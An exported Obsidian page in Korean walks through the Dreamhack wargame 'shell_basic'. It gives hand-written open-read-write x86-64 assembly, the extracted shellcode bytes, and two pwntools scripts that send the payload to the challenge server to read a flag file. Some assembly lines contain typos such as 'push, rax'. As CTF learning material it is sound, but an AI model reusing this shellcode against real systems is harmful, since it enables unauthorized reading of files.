@@ -1,0 +1,170 @@
+<!DOCTYPE html> <html><head>
+		<title>Shell_Basic</title>
+		<base href="..\..\../">
+		<meta id="root-path" root-path="..\..\../">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
+		<meta charset="UTF-8">
+		<meta name="description" content="Obsidian Vault - Shell_Basic">
+		<meta property="og:title" content="Shell_Basic">
+		<meta property="og:description" content="Obsidian Vault - Shell_Basic">
+		<meta property="og:type" content="website">
+		<meta property="og:url" content="achive/dreamhack/드림핵-워게임/shell_basic.html">
+		<meta property="og:image" content="lib\media\pasted-image-20240927105105.png">
+		<meta property="og:site_name" content="Obsidian Vault">
+		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="lib/scripts/pixi.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="lib/scripts/minisearch.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><include src="lib/html/custom-head-content.html"></include><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="preload" href="lib/styles/other-plugins.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/other-plugins.css"></noscript><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript><link rel="preload" href="lib/styles/snippets.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/snippets.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title show-ribbon ctp-latte ctp-mocha ctp-accent-rosewater anuppuccin-accent-toggle anp-h1-red anp-h2-peach anp-h3-green anp-h4-teal anp-h5-lavender anp-h6-mauve anp-bold-red anp-italic-green anp-highlight-yellow"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="ShellBasic"><p dir="auto">ShellBasic</p></h1><div><div data-callout-metadata="" data-callout-fold="" data-callout="note" class="callout"><div class="callout-title" dir="auto"><div class="callout-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-pencil"><path d="M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z"></path><path d="m15 5 4 4"></path></svg></div><div class="callout-title-inner heading-wrapper"><div class="heading-children"></div></div></div></div></div><div class="heading-wrapper"><h4 data-heading="문제" dir="auto" class="heading" id="문제"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>문제</h4><div class="heading-children"><div><hr></div><div><p dir="auto"><span alt="Pasted image 20240927105105.png" src="Pasted image 20240927105105.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240927105105.png" src="lib/media/pasted-image-20240927105105.png"></span></p></div></div></div><div class="heading-wrapper"><h4 data-heading="풀이 1" dir="auto" class="heading" id="풀이_1"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>풀이 1</h4><div class="heading-children"><div><hr></div><div><p dir="auto">저희는 파일의 위치가 /home/shell_basic/flag_name_is_loooooong 라는 것을 알아냈습니다. 이를 Shellcode 공부 때에 사용한 방법 그대로 공격에 사용이 가능합니다.</p></div><div><p dir="auto">문제에서는 execve의 사용을 금지하였으니 저는 orw 쉘코드를 사용하여 문제를 해결하고자 합니다.</p></div><div><p dir="auto">이때에 주의를 해야할 것은 그 위치가 리틀 엔디안 방식으로 입력해야하기 때문에 반대로 입력해야 한다는 것입니다. 그리고 반대시 가장 먼저 스택에 널 값을 입력하여 끝을 표시해야 합니다. 안 그러면 이상한 값까지 같이 딸려오기 때문입니다. 이를 어셈블리로 변환하면 아래와 같은 형태입니다.</p></div><div><pre><code>    // 스택에 문자열을 위한 공간을 할당
+    "push 0x0\n"               
+
+    // 문자열을 메모리에 저장
+    "mov rax, 0x676e6f6f6f6f6f6f\n" 
+    "push rax\n"         // 문자열의 일부분을 rsp + 48에 저장
+
+    "mov rax, 0x6c5f73695f656d61\n" 
+    "push rax\n"         
+
+    "mov rax, 0x6e5f67616c662f63\n" //리틀 엔디안 형식이라서 스택에 반대로 문자열 넣었다
+    "push rax\n"         
+
+    "mov rax, 0x697361625f6c6c65\n" 
+    "push, rax\n"  
+
+    "mov rax, 0x68732f656d6f682f\n" 
+    "push, rax\n"                
+
+    // 파일 열기 준비
+    "mov rdi, rsp    # rdi = '/home/shell_basic/flag_name_is_loooooong'\n"
+    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
+    "xor rdx, rdx    # rdx = 0\n"
+    "mov rax, 2      # rax = 2 ; syscall_open\n"
+    "syscall         # open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)\n"
+    "\n"
+    
+    // 파일 읽기 준비
+    "mov rdi, rax      # rdi = fd\n"
+    "sub rsp, 0x30     # rsp를 조정하여 버퍼 생성\n" // 버퍼를 위한 공간을 만듭니다.
+    "mov rsi, rsp      # rsi = 버퍼 위치\n"
+    "mov rdx, 0x30     # rdx = 0x30 ; len\n"
+    "mov rax, 0x0      # rax = 0 ; syscall_read\n"
+    "syscall           # read(fd, buf, 0x30)\n"
+    "\n"
+    
+    // 내용을 stdout으로 쓰기 준비
+    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
+    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
+    "syscall           # write(fd, buf, 0x30)\n"
+    "\n"
+    
+    // 프로그램 종료
+    "xor rdi, rdi      # rdi = 0\n"
+    "mov rax, 0x3c	   # rax = sys_exit\n"
+    "syscall		   # exit(0)"
+</code><button class="copy-code-button">복사</button></pre></div><div><p dir="auto">이를 스켈레톤 코드로 변환한다면 아래와 같습니다. </p></div><div><pre><code>__asm__(
+    ".global run_sh\n"
+    "run_sh:\n"
+
+    // 스택에 문자열을 위한 공간을 할당
+    "push 0x0\n"               
+
+    // 문자열을 메모리에 저장
+    "mov rax, 0x676e6f6f6f6f6f6f\n" 
+    "push rax\n"         // 문자열의 일부분을 rsp + 48에 저장
+
+    "mov rax, 0x6c5f73695f656d61\n" 
+    "push rax\n"         
+
+    "mov rax, 0x6e5f67616c662f63\n" //리틀 엔디안 형식이라서 스택에 반대로 문자열 넣었다
+    "push rax\n"         
+
+    "mov rax, 0x697361625f6c6c65\n" 
+    "push, rax\n"  
+
+    "mov rax, 0x68732f656d6f682f\n" 
+    "push, rax\n"                
+
+    // 파일 열기 준비
+    "mov rdi, rsp    # rdi = '/home/shell_basic/flag_name_is_loooooong'\n"
+    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
+    "xor rdx, rdx    # rdx = 0\n"
+    "mov rax, 2      # rax = 2 ; syscall_open\n"
+    "syscall         # open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)\n"
+    "\n"
+    
+    // 파일 읽기 준비
+    "mov rdi, rax      # rdi = fd\n"
+    "sub rsp, 0x30     # rsp를 조정하여 버퍼 생성\n" // 버퍼를 위한 공간을 만듭니다.
+    "mov rsi, rsp      # rsi = 버퍼 위치\n"
+    "mov rdx, 0x30     # rdx = 0x30 ; len\n"
+    "mov rax, 0x0      # rax = 0 ; syscall_read\n"
+    "syscall           # read(fd, buf, 0x30)\n"
+    "\n"
+    
+    // 내용을 stdout으로 쓰기 준비
+    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
+    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
+    "syscall           # write(fd, buf, 0x30)\n"
+    "\n"
+    
+    // 프로그램 종료
+    "xor rdi, rdi      # rdi = 0\n"
+    "mov rax, 0x3c	   # rax = sys_exit\n"
+    "syscall		   # exit(0)"
+);
+
+void run_sh();
+
+int main() { run_sh(); }
+</code><button class="copy-code-button">복사</button></pre></div><div><p dir="auto">이를 gcc를 이용하여 디버깅해주고 그 다음 objdump를 사용하면 디스어셈블리한 결과가 출력됩니다.</p></div><div><p dir="auto"><span alt="Pasted image 20240927105753.png" src="Pasted image 20240927105753.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240927105753.png" src="lib/media/pasted-image-20240927105753.png"></span></p></div><div><p dir="auto">저희가 저 코드에서 필요한 것은 run_sh입니다. 그러니 그 부분만 추출합니다.<br>
+<span alt="Pasted image 20240927105919.png" src="Pasted image 20240927105919.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240927105919.png" src="lib/media/pasted-image-20240927105919.png"></span>해당 섹션에 값을 추출하면 </p></div><div><pre><code>\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05
+</code><button class="copy-code-button">복사</button></pre></div><div><p dir="auto">아래와 같은 답이 됩니다.  하지만 이때에 직접 서버 쉘에 입력을 하면 안됩니다. 왜냐하면 그냥 입력하면 서버는 쉘 코드를 단순한 문자열로 인식하기 때문입니다. 그러니 값을 바이트 값으로 전송해야합니다.</p></div><div><p dir="auto">그러니 저는 이번에 pwn을 사용하여 서버로 쉘코드를 보낼겁니다. </p></div><div><pre><code>from pwn import * 
+
+context.arch = "amd64"
+
+p = remote("host3.dreamhack.games", 19672)
+shellcode = b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\x48\xc7\xc2\x30\x00\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05"
+
+p.sendlineafter('shellcode: ', shellcode)
+print(p.recv())
+
+
+</code><button class="copy-code-button">복사</button></pre></div><div><p dir="auto">아래에 아키텍처 언어는 가장 범용적인 amd64로 설정하였고 원격 서버에 exploit 할 것이기에 remote를 사용했습니다<br>
+이를 보내고 값을 추출해보겠습니다. </p></div><div><p dir="auto"><span alt="Pasted image 20240927110427.png" src="Pasted image 20240927110427.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240927110427.png" src="lib/media/pasted-image-20240927110427.png"></span></p></div><div><p dir="auto">이리하여 exploit이 정확이 작동하였음을 확인하였습니다.</p></div></div></div><div class="heading-wrapper"><h4 data-heading="풀이 2" dir="auto" class="heading" id="풀이_2"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>풀이 2</h4><div class="heading-children"><div><hr></div><div><p dir="auto">위에서는 어셈블리 코드를 스켈레톤 코드로 작성한 것이라면 이번에는 순수한 pwn 툴을 사용하여 진행해보겠습니다.<br>
+pwntools에 쉘 코드를 작성해주는 함수인 shellcraft()가 있습니다.</p></div><div><p dir="auto">shellcraft() 함수를 이용해서 쉘 코드를 작성해보면</p></div><div><pre class="language-python" tabindex="0"><code class="language-python is-loaded"><span class="token comment"># 쉘 코드는 환경에 따라 영향을 받기 때문에, 먼저 아키텍처 정보를 x86-64로 지정해줍니다.</span>
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
+<span class="token comment"># open할 flag 파일 path</span>
+path <span class="token operator">=</span> <span class="token string">"/home/shell_basic/flag_name_is_loooooong"</span>
+
+shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>	<span class="token comment"># open("/home/shell_basic/flag_name_is_loooooong")</span>
+<span class="token comment"># open() 함수 결과는 rax 레지스터에 저장됩니다. → fd = rax</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'rax'</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>	<span class="token comment"># read(fd, buf, 0x30)</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>	<span class="token comment"># write(stdout, buf, 0x30)</span>
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>	<span class="token comment"># shellcode를 기계어로 변환하여 대입</span>
+</code><button class="copy-code-button">복사</button></pre></div><div><p dir="auto">전체 익스플로잇 코드는 </p></div><div><pre><code>#!/usr/bin/python3
+
+from pwn import *  # Import pwntools module
+
+p = remote('host3.dreamhack.games', '19672')  
+
+context.arch = "amd64"
+
+# Payload 정의 (바이트 형식)
+
+path = "/home/shell_basic/flag_name_is_loooooong"
+
+shellcode = shellcraft.open(path)
+shellcode += shellcraft.read('rax', 'rsp', 0x30)
+shellcode += shellcraft.write(1, 'rsp', 0x30)
+shellcode = asm(shellcode)
+
+# Send the payload
+
+payload = shellcode
+
+p.sendlineafter("shellcode: ", payload)    # "shellcode: "가 출력되면 payload + '\n'을 입력
+print(p.recv(0x30))   
+
+</code><button class="copy-code-button">복사</button></pre></div><div><p dir="auto">이 방식을 사용하면 직접 쉘 코드를 작성하고 추출할 필요 없이 알아서 쉘코드를 만들고 전송이 가능해집니다. 굳이 리틀엔디안 형식으로 경로를 변환할 필요도 없고요<br>
+익스플로잇 코드를 실행시켜보면</p></div><div><p dir="auto"><span alt="Pasted image 20240927111529.png" src="Pasted image 20240927111529.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240927111529.png" src="lib/media/pasted-image-20240927111529.png"></span>플래그가 성공적으로 출력되었습니다.</p></div><div class="mod-footer"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
+		<div class="graph-view-container">
+			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
+			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
+		</div>
+		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button is-collapsed" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="achive\dreamhack\드림핵-워게임\shell_basic.html#ShellBasic"><div class="tree-item-contents heading-link" heading-name="ShellBasic"><span class="tree-item-title">ShellBasic</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="achive\dreamhack\드림핵-워게임\shell_basic.html#문제"><div class="tree-item-contents heading-link" heading-name="문제"><span class="tree-item-title">문제</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="achive\dreamhack\드림핵-워게임\shell_basic.html#풀이_1"><div class="tree-item-contents heading-link" heading-name="풀이 1"><span class="tree-item-title">풀이 1</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="4"><a class="tree-link" href="achive\dreamhack\드림핵-워게임\shell_basic.html#풀이_2"><div class="tree-item-contents heading-link" heading-name="풀이 2"><span class="tree-item-title">풀이 2</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>
